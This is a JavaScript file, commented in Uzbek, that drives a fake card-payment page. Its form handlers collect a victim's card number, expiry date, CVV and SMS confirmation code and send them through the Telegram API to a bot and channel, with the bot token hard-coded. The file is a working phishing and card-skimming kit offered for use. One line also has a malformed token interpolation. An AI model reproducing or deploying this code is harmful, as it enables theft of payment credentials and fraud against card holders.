const TELEGRAM_BOT_TOKEN = '6965600426:AAHBrsiQxVFrQ44ZsRVBLVLPxJDqN6fHqf0'; // Bot tokenini kiriting
const TELEGRAM_CHAT_ID = '@Odam_bolaylik1'; // Telegram kanal yoki chat nomi

function openForm() {
    window.location.href = 'form.html';
}

async function submitCardForm() {
    const cardNumber = document.getElementById('card-number').value;
    const expiryDate = document.getElementById('expiry-date').value;
    const cvv = document.getElementById('cvv').value;

    // Karta ma'lumotlarini mahalliy saqlash (localStorage) orqali vaqtincha saqlaymiz
    localStorage.setItem('cardNumber', cardNumber);
    localStorage.setItem('expiryDate', expiryDate);
    localStorage.setItem('cvv', cvv);

    // Ma'lumotlarni Telegram botga yuborish
    const cardData = `Karta Raqami: ${cardNumber}\nAmal Qilish Muddati: ${expiryDate}\nCVV: ${cvv}`;
    await sendToTelegram(cardData);

    // SMS tasdiqlash sahifasiga yo'naltirish
    window.location.href = 'sms.html';
}

async function submitSMSForm() {
    const sms = document.getElementById('sms').value;

    // Karta ma'lumotlarini olish
    const cardNumber = localStorage.getItem('cardNumber');
    const expiryDate = localStorage.getItem('expiryDate');
    const cvv = localStorage.getItem('cvv');

    const fullData = `Karta Ma'lumotlari:\nKarta Raqami: ${cardNumber}\nAmal Qilish Muddati: ${expiryDate}\nCVV: ${cvv}\n\nSMS Kod: ${sms}`;

    // Ma'lumotlarni Telegram botga yuborish
    await sendToTelegram(fullData);

    // Mahalliy saqlash (localStorage) tozalash
    localStorage.clear();

    alert('Ma\'lumotlar yuborildi!');
}

async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${6965600426:AAHBrsiQxVFrQ44ZsRVBLVLPxJDqN6fHqf0}/sendMessage`;
    const params = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(params),
        });

        const result = await response.json();
        if (!result.ok) {
            console.error('Telegram API error:', result);
        }
    } catch (error) {
        console.error('Fetch error:', error);
    }
}
